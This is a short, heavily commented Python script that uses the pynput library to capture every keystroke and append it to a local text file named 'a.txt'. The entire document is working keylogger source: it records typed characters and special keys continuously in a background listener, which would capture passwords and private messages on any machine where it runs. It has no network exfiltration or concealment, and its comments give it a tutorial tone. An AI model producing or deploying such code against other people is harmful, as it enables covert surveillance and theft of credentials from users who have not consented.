# Import the keyboard module from the pynput library to monitor keystrokes
from pynput import keyboard

# Define the name of the text file where the keystrokes will be saved
logfile = "a.txt"


# Define a callback function that executes every time a key is pressed
def on_press(key):
    try:
        # Try to extract the literal character of the key (e.g., 'a', '1', 'B')
        keydata = key.char
    except AttributeError:
        # If the key doesn't have a standard character (like Shift, Space, or Enter),
        # an AttributeError occurs. This block catches it and formats it nicely,
        # resulting in strings like "[Key.space]" or "[Key.enter]".
        keydata = f"[{key}]"

    # Open the log file in 'append' mode ("a") so new data is added to the end
    # of the file instead of overwriting existing data.
    with open(logfile, "a") as f:
        # Write the captured key data into the file
        f.write(keydata)


# Create and start a background thread that listens for keyboard events.
# It tells the listener to run the 'on_press' function whenever a key is pressed.
with keyboard.Listener(on_press=on_press) as listener:
    # Keep the script running continuously. Without 'join()', the script
    # would reach the end and immediately exit, stopping the listener.
    listener.join()